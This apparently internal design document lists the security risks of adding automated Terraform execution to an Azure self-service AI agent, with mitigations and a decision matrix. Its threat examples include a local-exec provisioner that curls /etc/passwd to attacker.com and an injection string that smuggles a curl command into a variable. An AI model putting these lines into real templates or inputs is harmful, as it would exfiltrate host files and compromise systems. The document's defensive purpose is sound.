# Phase 2 Deployment Challenges & Risk Registry

> **Purpose:** This document captures every significant risk, security concern, architectural challenge,
> and implementation decision that must be addressed before adding automated Terraform execution
> (Phase 2) to the Azure Self-Service AI Agent.
>
> Phase 1 (current state) is intentionally an **advisory-only** agent. It reads templates and
> produces deployment plans, but never executes anything. Phase 2 would bridge the gap between a
> plan and actual infrastructure — which introduces substantial complexity.

---

## Table of Contents

1. [Critical Security Risks](#1-critical-security-risks)
2. [Execution Architecture Decisions](#2-execution-architecture-decisions)
3. [Credential Management Challenges](#3-credential-management-challenges)
4. [Terraform State Management](#4-terraform-state-management)
5. [Multi-User Isolation](#5-multi-user-isolation)
6. [Error Handling & Information Leakage](#6-error-handling--information-leakage)
7. [Approval Workflow Complexity](#7-approval-workflow-complexity)
8. [Cost & Quota Management](#8-cost--quota-management)
9. [Observability & Auditability](#9-observability--auditability)
10. [The Safe Alternative: Script Generator](#10-the-safe-alternative-script-generator)
11. [Decision Matrix](#11-decision-matrix)

---

## 1. Critical Security Risks

### 1.1 Remote Code Execution (RCE) Backdoor

**Risk level: CRITICAL**

Running `terraform apply` locally on the agent server means the agent process can execute
arbitrary operating-system commands. Terraform's `local-exec` provisioner is standard HCL
that runs shell commands directly:

```hcl
resource "null_resource" "example" {
  provisioner "local-exec" {
    command = "curl http://attacker.com/exfil?data=$(cat /etc/passwd)"
  }
}
```

If any template contains (or is tampered with to contain) a `local-exec` block, an attacker
who controls template content has **full shell access** to the agent host.

**Mitigations required:**
- Static analysis of all `.tf` files to deny `local-exec`, `remote-exec`, and `file` provisioners before execution.
- Templates must be loaded from a trusted, immutable source (signed artifact store, not the local filesystem).
- Agent must run in a heavily sandboxed environment (Docker with seccomp/AppArmor, no outbound internet, no host mounts).

---

### 1.2 Command Injection via Variable Construction

**Risk level: HIGH**

When user-supplied values (resource group names, subscription IDs, tags, etc.) are
interpolated into CLI strings or shell commands, an attacker can break out of the intended
context:

```
User input: "my-rg\"; curl attacker.com; echo \""
Resulting shell:  terraform apply -var 'rg_name=my-rg"; curl attacker.com; echo "'
```

**Mitigations required:**
- **Never** construct `terraform` invocations by string interpolation of user input.
- Always pass variables via a generated `terraform.tfvars` file or the `-var-file` flag with a
  temp file written before execution.
- Validate every variable value with an allowlist regex **before** writing it to any file or executing any command.

---

### 1.3 Terraform State File as a Secret Store

**Risk level: HIGH**

`terraform.tfstate` is a JSON file that stores **plaintext** values of every resource attribute
Terraform manages. This includes:

- Connection strings with passwords
- Storage account access keys
- Key Vault URIs
- Private endpoint IPs
- AKS `kube_admin_config` (cluster admin certificate + key, base64-encoded)

A leaked or world-readable state file is equivalent to leaking all the secrets of the infrastructure it describes.

**Mitigations required:**
- **Never** store state locally on the agent host. Remote state is mandatory.
- Use **Azure Blob Storage** with:
  - Versioning enabled
  - Soft-delete enabled (minimum 30-day retention)
  - Private endpoint only (no public access)
  - Least-privilege SAS token or Managed Identity access for the agent
- Enable **Azure Blob Storage server-side encryption** (enabled by default, but verify CMK if required by policy).
- Audit who can `GET` from the state container.

---

### 1.4 Error Message Credential Leakage

**Risk level: HIGH**

Terraform error output frequently contains the values being passed to the provider:

```
Error: building AzureRM Client: obtain subscription() from Azure CLI: ...
  client_id="00000000-dead-beef-0000-000000000000"
  client_secret="secret-that-should-not-appear"
```

Streaming raw stderr directly to the chat UI exposes credentials to:
- The chat history (stored in DB)
- Any logging pipeline
- The browser's network inspector

**Mitigations required:**
- Parse Terraform output with a structured log parser. Never forward raw stderr.
- Apply a redaction pipeline that scrubs UUIDs, tokens, connection strings, and SAS parameters before any string reaches the UI, log store, or DB.
- Store only sanitised summaries in conversation history, never raw subprocess output.

---

### 1.5 Secrets in Transit

**Risk level: HIGH**

Users will need to provide `subscription_id`, `tenant_id`, `client_id`, and `client_secret`
to deploy anything. These values travel over HTTP (and possibly appear in application logs)
unless explicit controls are in place.

**Mitigations required:**
- TLS is **mandatory** — never accept credential input over plain HTTP. Enforce HTTPS at the load balancer or reverse proxy.
- Credential fields must be submitted via dedicated API endpoints, never embedded in chat messages.
- Log scrubbing must be applied at the logging handler level (e.g., custom `loguru` sink that redacts known secret patterns).
- Enforce short-lived credentials (Service Principal with certificate, or Managed Identity) over long-lived secrets where possible.

---

## 2. Execution Architecture Decisions

### 2.1 Where Does Terraform Run?

This is the most important architectural decision. Each option has a fundamentally different security and operational profile.

| Option | Description | Pros | Cons |
|---|---|---|---|
| **A. Local process** | Agent spawns `subprocess.Popen` on the host | Simple to implement | RCE risk, no isolation, no scale |
| **B. Docker-in-Docker** | Agent launches a Terraform container per run | Process isolation | Requires privileged daemon, complex socket management |
| **C. Dedicated Terraform container** | Pre-built image, agent sends job files | Good isolation | Needs an orchestrator or job queue |
| **D. Azure Container Instances (ACI)** | Agent triggers a short-lived ACI job | Strong isolation, ephemeral | Latency (~30s cold start), cost per run |
| **E. Azure Kubernetes + Jobs** | Terraform runs as a K8s Job | Best scalability & isolation | Significant infrastructure overhead |
| **F. Script generator only** | Agent generates a shell script, user runs it | Zero server-side execution risk | User must have local Terraform + Azure CLI |

**Recommendation:** Start with **Option F** (script generator) for safety. Graduate to **Option D** (ACI) when execution automation is truly needed and a security review has been completed.

---

### 2.2 Workspace Isolation

Each deployment run must be completely isolated from all others:

- **Filesystem:** Each run gets its own temp directory. The directory must be created with `mode=0o700`, used, and then **deleted** (not just abandoned) — even if the run fails.
- **Environment variables:** No shared environment between runs. Each subprocess must receive an explicit, minimal environment dict.
- **State:** Separate remote state key per user per template (e.g., `<tenant>/<user_id>/<template>/<run_id>.tfstate`).
- **Temp file cleanup:** Use `try/finally` or a context manager to guarantee deletion. Leaked tfvars files contain plaintext credentials.

---

### 2.3 Terraform Binary Trust

- Pin the exact Terraform version. Never allow user input to influence which binary is called.
- Verify the SHA-256 checksum of the Terraform binary at startup against HashiCorp's published checksums.
- If using containers, build the image from a Dockerfile with a specific, verified Terraform release — never `apt install terraform` (version drift risk).

---

## 3. Credential Management Challenges

### 3.1 Encryption at Rest

Any stored credential must be encrypted with a key that is:

- **Not stored in the same database** as the encrypted values.
- Managed by a Hardware Security Module (HSM) or at minimum Azure Key Vault.
- Rotatable without decrypting and re-encrypting all stored values (envelope encryption).

A simple `Fernet` key stored in `.env` is acceptable for a proof-of-concept but is **not production-ready** because the key and ciphertext live on the same host.

**Production pattern:** Azure Key Vault data encryption key (DEK) + envelope encryption, or use Azure Key Vault References directly from the app.

---

### 3.2 Credential Scope & Lifetime

- Users should provide the **minimum-privilege** Service Principal possible: `Contributor` scoped to the target resource group, not the subscription.
- Credentials should have a maximum lifetime enforced by the application (e.g., refuse to use a credential older than 24 hours without re-confirmation).
- Implement a credential rotation prompt: if the secret is within N days of its Azure expiry, warn the user.
- Never allow one user's credential to be referenced by another user's session.

---

### 3.3 Managed Identity as the Preferred Path

If the agent itself runs in Azure (ACI, AKS, Azure App Service), it can use a **System-Assigned Managed Identity** with a scoped role assignment. This eliminates the need for users to provide any credentials at all — deployment happens as the agent's identity.

**Trade-offs:**
- Simpler credential management.
- But: all users share the same identity, so per-user RBAC is lost.
- Requires a separate approval gate before any deployment (to prevent one user from deploying into another's resource group).

---

## 4. Terraform State Management

### 4.1 Remote Backend is Mandatory

Local state (`terraform.tfstate` next to the `.tf` files) must never be used in an agent scenario:

- It is lost when the temp workspace is cleaned up.
- It cannot be locked (concurrent `apply` runs will corrupt it).
- It cannot be audited.

**Required backend configuration:**

```hcl
terraform {
  backend "azurerm" {
    resource_group_name  = "rg-tfstate"
    storage_account_name = "sttfstateXXXXXX"
    container_name       = "tfstate"
    key                  = "${var.tenant_id}/${var.environment}/${var.template_name}.tfstate"
  }
}
```

The agent must dynamically inject the correct `key` per run and per user.

### 4.2 State Locking

Azure Blob Storage provides native lease-based locking for Terraform. Ensure:

- The storage account has a **resource lock** preventing accidental deletion.
- Orphaned leases (from crashed runs) are detected and broken after a configurable timeout.

### 4.3 `terraform destroy` Risk

If the agent supports `destroy` operations:

- Require explicit re-confirmation with the resource group name typed by the user.
- Apply a minimum cooldown period (e.g., cannot destroy within 1 hour of apply).
- Log the destroy operation to an immutable audit trail before executing.

---

## 5. Multi-User Isolation

### 5.1 Session Boundary Enforcement

The agent must guarantee that:

- `session_id` is cryptographically random and unguessable (UUID v4 minimum).
- One session can never read another session's collected variables, credentials, or conversation history.
- The credential store enforces ownership: `credential.owner_id == session.user_id` before any use.

### 5.2 Concurrent Deployment Prevention

If two requests from the same session trigger a deployment simultaneously:

- Without a lock, both may attempt to write to the same state file, causing corruption.
- Implement a per-user deployment lock (Redis, DB advisory lock, or Blob Storage lease) that prevents concurrent runs.

### 5.3 Noisy Neighbour / Resource Exhaustion

A single user triggering many expensive Terraform plans can exhaust:

- CPU/memory on the agent host
- Azure API rate limits (ARM throttling at ~1200 requests/hour per subscription)
- Azure Blob Storage transaction limits

**Mitigations:**
- Rate limiting per session (max N active plans at a time).
- Queue deployments rather than running them concurrently.
- Expose ARM throttling errors as user-friendly messages with retry guidance.

---

## 6. Error Handling & Information Leakage

### 6.1 Terraform Output Parsing

Terraform writes structured JSON output when invoked with `-json` flags:

```bash
terraform plan -json -out=plan.bin 2>&1
terraform apply -json plan.bin 2>&1
```

Parse this structured output rather than free-form text. This makes it possible to:

- Extract only the resource-level changes (additions, updates, deletions).
- Separate diagnostic messages from sensitive provider output.
- Apply targeted redaction rules.

### 6.2 Redaction Pipeline

Build a redaction pipeline that catches:

- UUIDs that match Azure Service Principal format
- Strings matching `client_secret=` or `password=` patterns
- Base64 blobs (likely certificates or kubeconfig data)
- Connection strings (`AccountName=...;AccountKey=...`)
- SAS tokens (`sv=...&sig=...`)

Replace with `[REDACTED]` before any string reaches the chat response, log sink, or database.

### 6.3 Generic Error Messages to Users

Terraform errors should be summarised at the level of "what failed" without exposing provider API responses. Example:

| Raw Terraform error | Safe user-facing message |
|---|---|
| `AuthorizationFailed: ... client_id=xxx` | `Deployment failed: insufficient Azure permissions. Check your Service Principal's role assignment.` |
| `ResourceGroupNotFound: rg-prod` | `Resource group 'rg-prod' was not found in the selected subscription.` |
| `QuotaExceeded: Standard_D4s_v3 in eastus` | `Quota exceeded for VM size Standard_D4s_v3 in East US. Request a quota increase or choose a different region.` |

---

## 7. Approval Workflow Complexity

### 7.1 Human-in-the-Loop

Fully automated `terraform apply` without human review is dangerous. A plan review step is mandatory:

1. Agent generates a deployment plan (`terraform plan -json`).
2. Plan is parsed and summarised (resources to add/change/destroy).
3. User reviews the summary and explicitly confirms.
4. Only after confirmation does `terraform apply` execute.

The `plan.bin` file must be used for `apply` (not a fresh apply without a plan file) to guarantee the user approved exactly what runs.

### 7.2 Plan Expiry

A Terraform plan file can become stale if the target infrastructure changes between plan and apply. Implement a maximum plan age (e.g., 15 minutes). If the user attempts to apply an expired plan, generate a fresh plan and require re-confirmation.

### 7.3 Approval Trail

Record:

- Who approved the plan (session/user ID)
- The exact plan JSON (or its SHA-256 hash)
- The timestamp of approval
- The result of apply (success/failure/partial)

This audit trail must be append-only and tamper-evident.

---

## 8. Cost & Quota Management

### 8.1 Pre-Flight Cost Estimation

Before executing `terraform apply`, integrate with the **Azure Pricing Calculator API** or use `infracost` to estimate the monthly cost of the resources being created. Present this estimate to the user during the approval step.

**Challenges:**
- Pricing varies by region, reservation type, and negotiated rates.
- Some resources have consumption-based pricing that cannot be estimated statically.
- infracost requires its own API key and has its own privacy implications.

### 8.2 Budget Guards

If the organisation uses Azure Cost Management:

- Check whether the target subscription has a budget alert configured.
- Warn the user if their deployment would push estimated spend past the alert threshold.
- Optionally: block deployment if the subscription has an active `BillingAccount` lock due to overdue payment.

### 8.3 Quota Pre-Checks

Before `terraform apply`, query the Azure API for:

- VM core quotas in the target region (`compute/skus` API)
- Storage account limits per subscription (250 per region)
- AKS node pool limits

Fail fast with a meaningful message rather than letting Terraform run for 10 minutes and then fail.

---

## 9. Observability & Auditability

### 9.1 Structured Logging

All deployment events must be logged in structured JSON format with:

- `timestamp` (ISO-8601, UTC)
- `session_id`
- `user_id` (or anonymised hash)
- `operation` (plan / apply / destroy)
- `template` (which Terraform module)
- `outcome` (success / failure / cancelled)
- `duration_seconds`
- `resource_count` (added/changed/destroyed)

**Never log:** raw Terraform output, variable values, credential IDs.

### 9.2 Azure Activity Log Integration

Every Terraform-driven resource creation generates entries in the Azure Activity Log. Ensure:

- The Service Principal used has a clear, identifiable display name (e.g., `sp-selfservice-agent-prod`).
- Tag all resources with `deployed-by: azure-self-service-agent` and `session-id: <UUID>` for traceability.

### 9.3 Alerting

Set up alerts for:

- Any `destroy` operation (immediate notification to infra team).
- Failed deployments above a threshold rate (may indicate template issues or abuse).
- Abnormal plan sizes (e.g., plan showing >20 resources to destroy unexpectedly).

---

## 10. The Safe Alternative: Script Generator

Instead of executing Terraform server-side, the agent can generate a fully parameterised
deployment package that the user runs **locally**. This eliminates all server-side execution risks.

**Output package:**

```
deploy-<template>-<timestamp>/
├── main.tf                  # Symlink or copy of the approved template
├── terraform.tfvars         # Pre-filled with non-sensitive values the user confirmed
├── terraform.tfvars.sensitive.example   # Template for client_secret, etc. — NOT pre-filled
├── backend.tf               # Remote state config (user fills storage details)
├── deploy.sh                # Step-by-step shell script with comments
└── README.md                # Human-readable instructions
```

**`deploy.sh` example:**

```bash
#!/usr/bin/env bash
set -euo pipefail

echo "=== Azure Self-Service Deployment ==="
echo "Template: AKS Cluster"
echo ""
echo "Prerequisites:"
echo "  - Azure CLI installed and logged in (az login)"
echo "  - Terraform >= 1.6.0 installed"
echo "  - Service Principal with Contributor role on the target resource group"
echo ""
echo "Fill in terraform.tfvars.sensitive with your credentials before continuing."
read -p "Press Enter when ready..."

terraform init
terraform plan -var-file=terraform.tfvars -var-file=terraform.tfvars.sensitive -out=plan.bin
echo ""
echo "Review the plan above carefully."
read -p "Type 'yes' to apply: " confirm
[[ "$confirm" == "yes" ]] && terraform apply plan.bin || echo "Deployment cancelled."
```

**Advantages:**
- Zero server-side execution risk.
- User retains full control and visibility.
- No credential storage on the server.
- Works immediately without any Phase 2 infrastructure.

**Limitations:**
- Requires user to have Terraform + Azure CLI installed locally.
- Not suitable for users who cannot run local tooling (compliance sandbox environments).

---

## 11. Decision Matrix

Use this matrix when deciding whether to proceed with Phase 2 automated execution.

| Requirement | Advisory Only (Phase 1) | Script Generator | Automated Execution (Phase 2) |
|---|:---:|:---:|:---:|
| Zero server-side execution risk | ✅ | ✅ | ❌ |
| Works without local tooling | ✅ | ❌ | ✅ |
| No credential storage needed | ✅ | ✅ | ❌ |
| Real-time deployment feedback | ❌ | ❌ | ✅ |
| Enforcement of deployment standards | Advice only | Partial | ✅ |
| Audit trail | ❌ | ❌ | ✅ |
| Implementation complexity | Low | Low | Very High |
| Security review required | No | No | **Yes — mandatory** |
| Estimated implementation effort | Done | 1–2 days | 4–8 weeks |

---

## Summary

Phase 2 automated execution is **achievable but not trivial.** The five most dangerous issues are:

1. **RCE via local-exec** — any `local-exec` in a Terraform template gives an attacker a shell on the agent host.
2. **Credential leakage in error messages** — Terraform errors contain the values it was called with; raw output must never reach the user.
3. **State file exposure** — `terraform.tfstate` contains plaintext secrets; remote state with strict ACLs is non-negotiable.
4. **Command injection** — user input must never be interpolated into shell commands; always use tfvars files.
5. **No isolation** — concurrent runs from different users on a shared host will collide unless workspace isolation is carefully implemented.

Before starting Phase 2, a formal security design review and penetration test of the execution environment is strongly recommended.

---

*Document created: 2025 | Azure Self-Service AI Agent project*
